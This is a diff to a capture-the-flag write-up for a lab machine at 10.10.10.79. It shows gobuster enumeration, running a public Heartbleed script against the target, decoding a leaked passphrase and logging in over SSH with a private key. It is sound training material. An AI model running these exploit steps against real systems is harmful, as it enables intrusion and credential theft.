@@ -56,6 +56,7 @@ gobuster dir -e -w /usr/share/wordlists/dirb/common.txt -u 10.10.10.79 -k -n -r 
 + Port 443 is running a version of OpenSSL that is vulnerable to **Heartbleed**!
 + `git clone https://gist.github.com/eelsivart/10174134`
 + `python heartbleed.py 10.10.10.79`
++ View **decode.php** and **text** value.
 ```
 ┌──(kali㉿kali)-[~/Desktop/10174134]
 └─$ python2 heartbleed.py 10.10.10.79     
@@ -93,16 +94,16 @@ User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/boo
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/54f4c737-c556-4002-a270-a5a4e453b02a)
 
-+ Navigate to **http://10.10.10.79/decode.php**. Copy the string, and decode it.
++ Navigate to **http://10.10.10.79/decode.php**. Copy the **text** value, and decode it.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8043e8ba-37eb-4804-adc4-599ff419d146)
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7fe3609b-9537-4bb9-be08-aa29b64eefff)
 
 + Use the decoded value `heartbleedbelievethehype` on ssh login.
-+ Login ssh again: `ssh -i id_rsa hype@10.10.10.79`
++ Try to login ssh again: `ssh -i id_rsa hype@10.10.10.79`
 + If you face a problem **sign_and_send_pubkey: no mutual signature supported**, check [the link](https://hazercloud.com/blog/sign_and_send_pubkey-no-mutual-signature-supported/).
-+ We login successfully.
++ We login successfully, and get the user flag.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ab0a4080-0c44-44b8-8073-e4f321d78fc9)
 
